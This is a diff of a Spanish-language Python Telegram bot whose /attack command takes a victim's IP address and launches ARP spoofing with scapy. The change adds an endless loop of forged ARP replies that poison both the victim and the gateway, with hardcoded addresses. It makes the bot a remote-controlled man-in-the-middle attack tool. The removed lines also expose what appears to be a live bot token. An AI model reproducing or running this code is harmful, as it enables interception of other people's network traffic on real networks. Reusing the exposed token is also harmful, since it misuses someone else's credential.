@@ -1,5 +1,7 @@
 import logging
 import os
+import threading
+import time
 
 from telegram import ReplyKeyboardMarkup
 from telegram.ext import CommandHandler, ConversationHandler, MessageHandler, Updater
@@ -7,10 +9,7 @@ from scapy.all import ARP, Ether, send
 
 a = 1
 
-ipg = '192.168.75.1'
-
-IP, GATEWAY = range(2)
-
+IP = range(1)
 
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                     level=logging.INFO)
@@ -18,21 +17,22 @@ logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s
 logger = logging.getLogger(__name__)
 
 def start(update, context):
-    """Comando /start"""
 
-    update.message.reply_text('Hola pringao, usa /help para ver los comandos disponibles')
+    update.message.reply_text('Hola, usa /help para ver los comandos disponibles')
 
 
 def help(update, context):
-    """Comando /help"""
 
-    update.message.reply_text('Use el comando /attack para realizar el ataque')
+    update.message.reply_text('Los comandos disponibles son los siguientes:')
+    update.message.reply_text('')
+    update.message.reply_text('/start')
+    update.message.reply_text('/help')
+    update.message.reply_text('/attack')
 
 def attack(update, context):
 
     reply_keyboard = [['/cancel']]
-    
-    ip = update.message.reply_text(
+    update.message.reply_text(
         '¿Cuál es la dirección IP de su víctima? (Escriba "/cancel" para cancelar la petición)',
         reply_markup=ReplyKeyboardMarkup(reply_keyboard, one_time_keyboard=True),
     )
@@ -40,33 +40,34 @@ def attack(update, context):
     return IP
 
 def set_ip(update, context):
-  
-    ip = update.message.text.strip()
 
-    logger.info(f'ARP spoofing iniciado para {ip}')
+    ip = update.message.text
 
+    gateway_ip = "192.168.75.1"
+    gateway_mac = "00:50:56:F6:D3:5A"
+    
     target_ip = ip
-    gateway_ip = ipg
+    target_mac = "00:0C:29:14:84:48"
 
-    try:
-        arp = ARP(pdst=target_ip)
-        target_mac = arp.hwsrc
-        gateway_mac = ARP(pdst=gateway_ip).hwsrc
+    arp = ARP(pdst=target_ip)
+    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
+    packet = ether/arp
+    result = srp(packet, timeout=3, verbose=0)[0]
 
-        packet_target = Ether(dst=target_mac)/ARP(op="is-at", hwsrc=gateway_mac, psrc=gateway_ip, pdst=target_ip)
-        packet_gateway = Ether(dst=gateway_mac)/ARP(op="is-at", hwsrc=target_mac, psrc=target_ip, pdst=gateway_ip)
+    for sent, received in result:
+        target_mac = received.hwsrc
 
-        send(packet_target, verbose=False)
-        send(packet_gateway, verbose=False)
+    while True:
+        # Envía una solicitud ARP indicando que la dirección MAC del gateway es la de la víctima
+        send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac))
 
-        logger.info(f'ARP spoofing finalizado para {ip}')
-        update.message.reply_text(f'Se realizó ARP spoofing a la dirección IP {ip}')
+        # Envía una solicitud ARP indicando que la dirección MAC de la víctima es la del gateway
+        send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac))
 
-    except Exception as e:
-        logger.error(f'Ocurrió un error al realizar el ARP spoofing: {str(e)}')
-        update.message.reply_text('Ocurrió un error al realizar el ARP spoofing')
+        time.sleep(2)
 
     return ConversationHandler.END
+
 
 def cancel(update, context):
 
@@ -74,20 +75,20 @@ def cancel(update, context):
 
     return ConversationHandler.END
 
+
 conv_handler = ConversationHandler(
     entry_points=[CommandHandler('attack', attack)],
-  
+
     states={
         IP: [MessageHandler(None, set_ip)]
     },
-  
+
     fallbacks=[MessageHandler(None, cancel)]
 )
 
 def main():
-    """Se inicia el bot"""
 
-    updater = Updater("6140799429:AAH3UwOcl4GlqqIy0oRKrTjbEfUAWWCicgU", use_context=True)
+    updater = Updater("<TOKEN>", use_context=True)
 
     dp = updater.dispatcher
 
@@ -96,11 +97,10 @@ def main():
     dp.add_handler(conv_handler)
     updater.start_polling()
 
-    logger.info("El bot se ha iniciado correctamente")
     updater.idle()
 
 if __name__ == '__main__':
     main()
-    
+
 # By Sxmpl3.
 
